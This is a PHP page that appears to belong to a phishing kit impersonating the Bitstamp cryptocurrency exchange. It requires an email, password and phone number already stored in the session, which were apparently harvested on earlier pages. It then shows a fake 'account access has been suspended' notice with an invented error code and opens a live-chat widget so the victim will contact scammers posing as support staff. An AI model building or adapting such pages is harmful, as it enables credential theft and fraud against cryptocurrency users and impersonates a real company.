<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Bitstamp Trusted Crypto Exchange | Buy & Sell Cryptocurrencies';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        if(empty($_SESSION["phone_number"])) {
            redirect(base_url('verify.php'));
        }
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-5 my60 text-center">
                    <h3 class="text-center fw-semibold py10 text-danger">Important Message</h3>
                    <div class="lh35">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately</div>
                    <p class="fs25 lh40 mt40 fw-bold">Error CODE: EBRX1:6X76D</p>
                    <a href="javascript:void(Tawk_API.toggle())" class="btn btn-success btn-primary-2 border-0 rounded-pill btn-lg btn-block rounded-0 fs16 py11 mt29 px60">Ask expert</a>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>